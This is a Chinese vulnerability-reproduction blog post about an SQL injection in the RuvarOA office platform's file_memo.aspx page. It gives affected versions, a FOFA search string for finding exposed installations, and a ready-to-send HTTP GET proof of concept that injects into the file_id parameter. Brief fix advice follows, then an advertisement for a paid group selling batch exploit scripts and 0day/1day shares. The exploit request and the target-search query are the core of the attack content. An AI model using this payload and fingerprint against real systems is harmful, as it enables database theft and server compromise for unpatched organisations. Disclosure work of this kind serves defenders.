#  「漏洞复现」RuvarOA协同办公平台 file_memo.aspx 存在SQL注入漏洞   
冷漠安全  冷漠安全   2024-05-30 23:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qRzaH5GUoT3wjfxgNKKQaVgq5UdQuTjibZ7l0YMRTIbMrfABFictia4ZEXKWAic1RbHRib9CiajtbcKQcw/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
RuvarOA办公自动化系统是广州市璐华计算机科技有限公司采用组件技术和Web技术相结合，基于Windows平台，构建在大型关系数据库管理系统基础上的，以行政办公为核心，以集成融通业务办公为目标，将网络与无线通讯等信息技术完美结合在一起设计而成的新型办公自动化应用系统  
。  
  
0x03  
  
**漏洞威胁**  
  
RuvarOA协同办公平台 存在多处 SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
影响范围：  
```
RuvarOA V6.01 、RuvarOA V12.01
```  
  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="txt_admin_key"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rIoGR4hEtO35ZM7ycD5pncGblmSP1WIlozQToRbLhsFDk8demUWPUwCwMMvJNvbwA00zECibl8ARQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
POC  
```
GET /filemanage/file_memo.aspx?file_id=@@version HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rIoGR4hEtO35ZM7ycD5pncfUFoQVGJ1onKRRsmZHJc4I6qrTKRhXkkUaRN5MSGrr2ZBT7SnvoGbw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rIoGR4hEtO35ZM7ycD5pncrkWUkZLVsgz82sH1IeolPxyEicDrYkpDbV8VSblwrhD1MZ7Tlia74Nrw/640?wx_fmt=png&from=appmsg "")  
  
0x07  
  
**修复建议**  
  
在网页代码中需要对用户输入的数据进行严格过滤。  
  
部署Web应用防火墙，对数据库操作进行监控。  
  
升级至最新版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rIoGR4hEtO35ZM7ycD5pnc9AFTAnHR4PyJHKhxA23eUzo1PUgReGjqwib7BSIFgmxlhvj7vv2pT8A/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0rIoGR4hEtO35ZM7ycD5pncLPhkGt7tDuagrOIibhc99icZRbiaofqQ7KU170CMy6YHiaZPS98bXZlUEA/640?wx_fmt=gif&from=appmsg "")  
  
  
